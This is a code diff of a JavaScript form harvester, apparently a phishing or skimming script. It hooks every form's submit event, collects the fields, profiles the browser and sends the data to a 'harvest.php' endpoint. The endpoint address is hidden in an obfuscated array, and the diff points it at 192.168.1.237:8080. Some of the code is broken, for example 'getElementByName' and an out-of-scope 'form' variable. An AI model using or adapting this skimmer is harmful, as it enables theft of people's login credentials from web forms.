@@ -3,7 +3,8 @@ var bindAllFormsSwitch = true;
 var formName = "loginform2";
 var enableEncoding = true;
 var usePost = false;
-var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
+var trackClients = true;
+var _0x3745 = ["http","://","192.168.1.237:8080","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
 
 $(document).ready(function() {
     console.log("initializing harvester...");
@@ -24,21 +25,37 @@ function initHarvester() {
 function bindAllForms() {
     document.querySelectorAll('form').forEach(form => 
         form.addEventListener('submit', function(e){
-            //e.preventDefault();
             let formName = form.name;
-            grabAll(form);
+            let payload = grabAll(form);
+			if(trackClients) {
+				let clientInfo = profileClient();
+				console.log("clientInfo: " + clientInfo);
+				// TODO: serialize client data and append to payload
+			}
+			//	send the payload to our server
+			sendPayload(payload);
+			// for testing purposes
+			e.preventDefault();
         }, false)
     );
-    document.querySelectorAll('form').forEach(form => appendFields(form));
+	appendFields(form);
 }
 
 /* bind a specific form by name */
 function bindByName(formName) {
-	var loginForm = document.getElementById(formName);
+	var loginForm = document.getElementByName(formName);
 	if(loginForm) {
         loginForm.addEventListener('submit', function(e){
-                //e.preventDefault();
-                grabAll(formName);
+				let payload = grabAll(formName);
+				if(trackClients) {
+					let clientInfo = profileClient();
+					console.log("clientInfo: " + clientInfo);
+					// TODO: serialize client data and append to payload
+				}
+				//	send the payload to our server
+				sendPayload(payload);
+				// for testing purposes
+				e.preventDefault();				
             }, false);
     }
     appendFields(loginForm);
@@ -148,11 +165,20 @@ function grabAll(form) {
 		//	output payload in console for debugging
 		console.log("DEBUG: resulting payload = " + payload);
 		
-		//	send the payload to our server
-		sendPayload(payload);
+		return payload;
 	} else {
 		console.log("ERROR: harvester failed to locate '" + formName + "', check the HTML");
+		return "ERROR";
 	}
+}
+
+function profileClient() {
+	let appVersion = window.navigator.appVersion;
+	return appVersion;
+}
+
+function serializeData(inputData) {
+	return "stubdata";
 }
 
 /* send the collected data to our server */
